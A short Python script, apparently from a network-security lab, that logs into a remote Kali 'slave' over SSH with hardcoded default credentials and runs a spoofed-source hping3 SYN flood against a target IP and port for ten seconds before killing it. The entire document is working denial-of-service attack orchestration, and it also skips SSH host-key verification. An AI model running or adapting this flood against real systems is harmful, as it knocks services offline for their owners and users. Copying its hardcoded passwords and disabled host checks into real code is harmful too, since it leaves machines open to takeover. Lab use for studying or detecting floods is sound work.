import paramiko
import time

def call_slave(slave_ip, victim_ip, port_number, attack_type):
    print("Connecting to slave...")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(slave_ip, username="kali", password="kali")

    print("Connected!")

    if attack_type == "SYN":
        command = f"hping3 -S -p {port_number} -i u10000 --rand-source --flood {victim_ip}"

    print(f"Launching {attack_type} attack...")

    # 發動攻擊
    ssh.exec_command(f"echo kali | sudo -S {command}", get_pty=True)

    # 等待一段時間後強制結束
    time.sleep(10)
    # 結束攻擊
    stdin, stdout, stderr = ssh.exec_command("echo kali | sudo -S pkill -9 -f hping3", get_pty=True)
    stdout.channel.recv_exit_status()  # 等待 pkill 完成

    # 再查一次
    stdin, stdout, stderr = ssh.exec_command("ps aux | grep hping3")
    print("hping3 processes still running:\n", stdout.read().decode())


    ssh.close()
    print(f"Stopped {attack_type} attack from {slave_ip}\n")

# 設定參數
slave_ip = "192.168.137.128"
victim_ip = "192.168.137.128"  
port_number = 12345
attack_type = "SYN"

call_slave(slave_ip, victim_ip, port_number, attack_type)
